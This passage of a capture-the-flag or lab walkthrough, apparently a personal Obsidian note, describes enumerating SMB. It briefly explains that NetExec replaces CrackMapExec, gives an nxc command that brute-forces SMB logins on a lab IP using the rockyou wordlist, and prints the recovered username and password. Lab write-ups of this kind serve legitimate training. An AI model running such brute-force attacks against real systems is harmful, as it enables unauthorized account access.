- Create a file called `users.txt` with the names you found on the Web Server section.

## nxc = NetExec

It’s basically the **modern fork/replacement** of **CrackMapExec (CME)**.  

The Porchetta-Industries team renamed/rebranded it around 2023–2024 because CME had lots of old code and maintenance issues.

## Brute-forcing

- Brute-force that list with rockyou.txt wordlist to find a password.
```
nxc smb 10.10.242.15 -u users.txt -p /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding
```

After several minutes you'll find the following credentials:

![[Force the username list against SMB-20250825105741732.webp]]

Credentials:
wrohit:superstar

**Next step:** [[SMB shares]]
